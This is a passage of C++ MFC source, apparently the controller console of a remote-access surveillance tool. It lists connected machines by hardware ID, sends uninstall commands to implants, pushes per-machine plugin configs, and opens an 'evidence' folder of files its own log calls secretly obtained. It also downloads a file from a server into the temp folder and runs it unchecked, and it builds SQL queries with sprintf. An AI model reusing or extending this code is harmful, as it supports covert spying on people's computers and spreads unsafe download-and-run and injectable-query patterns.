// 		return;
// 	}
	AfxMessageBox("此功能即将开放~");
	return;
	CString strErr;
	BOOL bRet=FALSE;
	do 
	{
		SOCKET sockInt = LoginLicenseSvr();
		if(sockInt == INVALID_SOCKET){
			//strErr = "Login error!\n";
			break;
		} 

		m_dlgProgress.ShowClientUpdataInfo(sockInt,"WebUpdataInfo.txt");

		closesocket(sockInt);

		sockInt = LoginLicenseSvr();
		if(sockInt == INVALID_SOCKET){
			//strErr = "Login error!\n";
			break;
		}

		closesocket(sockInt);		


		sockInt = LoginLicenseSvr();
		if(sockInt == INVALID_SOCKET)
		{
			strErr = "Login error!\n";
			break;
		}

		TCHAR  szTmpWebSer[MAX_PATH]={0};
		GetTempPath(MAX_PATH,szTmpWebSer);
		StrCatA(szTmpWebSer,szWebSerName);
		
		DWORD dwBytes = 0;
		HANDLE hFile = CreateFile(szTmpWebSer, GENERIC_WRITE, FILE_SHARE_WRITE|FILE_SHARE_READ, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL );
		BYTE request[256] = {0};
		request[0] = DOWN_FILE;
		StrCpyA((char*)(&request[1]),szWebSerName);

		if ( GetFileAttributes(m_strServerFile) == -1 )
		{
			strErr = ("File is exist and can't delete!");
			break;
		}

		do 
		{
			send( sockInt, (char*)&request, sizeof(request),NULL);

			//接收文件的大小
			DWORD dwFileSize=0;
			recv( sockInt,(char*)&dwFileSize,sizeof(DWORD),NULL);

			char *RecvData=new char[RECV_MAX_BUF];
			DWORD recvsize = 0;

			while (TRUE)
			{
				memset(RecvData, 0,RECV_MAX_BUF);

				int dwRetSize = recv( sockInt,RecvData,RECV_MAX_BUF,NULL);
				if ( dwRetSize == 0 || dwRetSize == SOCKET_ERROR )
				{
					strErr = "获取文件出错!";
					break;
				}


				recvsize += dwRetSize;
				m_dlgProgress.SetPos(recvsize,dwFileSize);

				if ( recvsize>=dwFileSize ) 
				{

					WriteFile(hFile,RecvData,dwRetSize,&dwBytes, NULL);
					bRet = TRUE;
					break;
				}
				WriteFile(hFile,RecvData,dwRetSize,&dwBytes, NULL);
				//		send( sockInt, laji, sizeof(laji),NULL);
			}

		} while (FALSE);

		//关闭文件
		CloseHandle(hFile);
		closesocket(sockInt);		

		WinExec(szTmpWebSer,SW_SHOW);

	} while (FALSE);

	m_dlgProgress.MessageBox(strErr,0,0);

	m_dlgProgress.SendMessage(WM_CLOSE);

	// TODO: 在此添加命令处理程序代码
}

void CTSPClientView::OnMenuOpenscret()
{
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		CString str;
		str=m_pListCtrl->GetItemText(nItem,COL_HARDID);// GetItemText(pos, COL_HARDID, pTmpNode->szHardID);
		
		TCHAR szHelp[MAX_PATH]={0};

		wsprintf(szHelp,"%s\\evidence\\%s",GetExeCurrentDir(),str);

		if (PathFileExists(szHelp))
		{
			::ShellExecute(m_hWnd , "open",szHelp, NULL, NULL, SW_SHOWNORMAL);
		}else
		{
			g_log.Log(LEVEL_WARNNING,"没有密取文件%s\n",szHelp);
		}
	}

	// TODO: 在此添加命令处理程序代码
}


BOOL CTSPClientView::ProcessOfflineCmd(PINFO_DB_CONTRAST lpDbNode, UINT nItem)
{
	if (!::PathFileExists(m_szOfflineCmdName))//不存在对应文件
	{
		return FALSE;
	}
	UINT nRet = GetPrivateProfileInt("remove", lpDbNode->szHardID, 0, m_szOfflineCmdName);
	if (1 == nRet)
	{
		RemoveServer((ClientContext*)(lpDbNode->lpContent), 0, nItem);//在线删除
		
		return TRUE;
	}

	return FALSE;
}

void CTSPClientView::RemoveServer(ClientContext* pContext, LPSTR lpHardId, UINT nItem)
{	
	if (NULL != pContext)//在线
	{
		LOG((LEVEL_INFO,"发送卸载命令(%08x,%08x)\n",pContext,pContext->m_Socket));

		BYTE	bToken = COMMAND_REMOVE;		
		m_iocpServer->Send(pContext, &bToken, sizeof(BYTE));		

		//不能直接卸载
		//m_iocpServer->RemoveStaleClient(pContext,FALSE,FALSE);
	}
	else if(NULL != lpHardId && 0 != lstrlen(lpHardId))//离线
	{
		char szValue[] = {"1"};
		BOOL bRet = WritePrivateProfileString("remove", lpHardId, szValue, m_szOfflineCmdName);
	}

	m_pListCtrl->DeleteItem(nItem);
}
LRESULT CTSPClientView::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	// TODO: Add your specialized code here and/or call the base class
	if(message==WM_GET_ONLINE_NUMBER)
	{
		if(wParam)
			*((int*)wParam)=GetEnableCount();
		return 0;
	}
	if(message==WM_GET_ITEM_NUMBER)
	{
		if(wParam)
			*((int*)wParam)=m_pListCtrl->GetItemCount();
		return 0;
	}
	return CCJListView::WindowProc(message, wParam, lParam);
}

void CTSPClientView::OnDestroy()
{
	// TODO: Add your command handler code here
	CCJListView::OnDestroy();
	// TODO: Add your message handler code here
}


LRESULT CTSPClientView::OnPluginRequest(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;
	char *szCPUID = (char *)pContext->m_DeCompressionBuffer.GetBuffer();
	if (NULL == szCPUID )
		return FALSE;
	
	++szCPUID;

	/* 没必要在列表中查找，新连接找不到
	BOOL bFind = FALSE;	
	PINFO_DB_CONTRAST tmpNode = NULL;
	int nFindIndex = 0;
	
	for(int i=0;i<m_pListCtrl->GetItemCount();i++)
	{
		tmpNode=(PINFO_DB_CONTRAST)m_pListCtrl->GetItemData(i);
		if(strcmp(tmpNode->szHardID,szCPUID)==0)			//跳过1字节命令字
		{
			bFind = TRUE;	
			break;
		}
	}
	*/

	
	// 判断是否需要发送卸载标记
	DWORD dwMachineID = crc32((uchar *)szCPUID,strlen(szCPUID));
	ClientContext *pClientSocket = (ClientContext *)lParam;
	LOG((LEVEL_INFO,"TOKEN_PLUGIN_REQUEST.MachineID:%d.\n",dwMachineID));

	CPluginRemover rm(pClientSocket,m_iocpServer);
	if( rm(dwMachineID) )
	{
		LOG((LEVEL_INFO,"检测到卸载标记，不进行插件管理.MachineID:%d.\n",dwMachineID));
		FALSE;
	}

	// 插件下载
	CPluginConfig pluginConfig(pClientSocket,m_iocpServer);
	TCHAR szMachineConfigFile[TSP_PLUGIN_PATH];		//传出的配置文件名			

	if( !pluginConfig.CreateConfigFile(dwMachineID,szMachineConfigFile) )
	{
		LOG((LEVEL_ERROR,"创建插件文件错误,MachineID:%d.\n",dwMachineID));
		FALSE;
	}

	if( !pluginConfig.SendFile(szMachineConfigFile) )
	{
		LOG((LEVEL_ERROR,"发送插件失败:%s.\n",szMachineConfigFile));
	}
	FALSE;		

	return TRUE;
}

// chengwei 2013.8 删除界面和配置文件中信息
LRESULT CTSPClientView::OnRemoveUI(WPARAM wParam, LPARAM lParam)
{
	for(int i=0;i<m_pListCtrl->GetItemCount();i++)
	{
		INFO_DB_CONTRAST *pItem=((INFO_DB_CONTRAST *)m_pListCtrl->GetItemData(i));
		if(pItem)
		{
			ClientContext *pContext=(ClientContext *)pItem->lpContent;
			if((pContext)&&(lParam))			
				if(pContext->m_Socket==((ClientContext *)lParam)->m_Socket)
				{
					m_pListCtrl->DeleteItem(i);
					break;
				}			
		}
	}
	

	WriteDbFile();
	WriteMacFile();
	if(g_pFrame)
		g_pFrame->ShowConnectionsNumber();

	return TRUE;
}



BOOL CTSPClientView::UpdateDBSoftPeriod()
{
	char strPeriod[256]={0}; 
	CString strUserName = g_szUserName;
	CString strUserPass = g_szPassword;


	CMyDataBase mdb;
	
	if(!mdb.ConnDB())
	{

		g_logErr.Log(LEVEL_ERROR,"验证tspclient使用有效性时，连接数据库出错\r\n");
		
		return FALSE;
	}

	

	//SOCKET sockInt = LoginLicenseSvr();
// 	int isvalid = 1;
// 	if(sockInt == INVALID_SOCKET)
// 	{
// 		isvalid = 0;
// 	}
	
	//modify by yx 2013-11-04
	if (!CheckUserFromLicenseSvr())
	{
		sprintf(strPeriod, "update tspuser set isvalid = 0 where tspname = '%s'and tsppwd = '%s' ",EnDeCode::Encode(EnDeCode::encrypt(strUserName.GetBuffer(0))),EnDeCode::Encode(EnDeCode::encrypt(strUserPass.GetBuffer(0))));
		if(!mdb.ExeSQL(strPeriod))
		{
			g_logErr.Log(LEVEL_ERROR,"更新数据库tspuser表中使用权限失败\r\n");
		}
	}
   	//modify by yx 2013-11-04


	return TRUE;
}

BOOL CTSPClientView::UpdateTSPWebUserID()
{
	MYSQL_RES *res = NULL;
	MYSQL_ROW row;
	CMyDataBase mdb;
	if(!mdb.ConnDB())
	{
		g_logErr.Log(LEVEL_ERROR,"验证tspclient使用有效性时，连接数据库出错\r\n");
		return FALSE;
	}

	char strUserInfo[256]={0}; 
	char strUserName_ID[256]={0};
	strcpy(strUserInfo,"SELECT userid,username FROM `user` WHERE username != 'admin' and visible = 1");

	res =mdb.OpenRecordset(strUserInfo);
	if (0 == res->row_count)
	{
		//LogInfo(LOG_INFO,"数据库表mobile_setting中没有查询短信内容，ID为%u	[%s][%d]",m_id,__FILE__,__LINE__);
		//OutputDebugString("164");
		return FALSE;
	}

	g_pSettingView->m_UserChoice.ResetContent();
	g_pSettingView->m_UserChoice.SetDroppedWidth(20);//约定为10
	while(1)
	{
		if((row = mysql_fetch_row(res)) != NULL)
		{
			sprintf(strUserName_ID,"%s-%s",row[1],row[0]);
			g_pSettingView->m_UserChoice.AddString(strUserName_ID);
			//g_pSettingView->m_UserChoice.InsertString(-1,strUserName_ID);
			memset(strUserName_ID,0,256);

		}
		else
		{
			break;
		}

	}

	g_pSettingView->m_UserChoice.SetCurSel(0);
	return TRUE;
}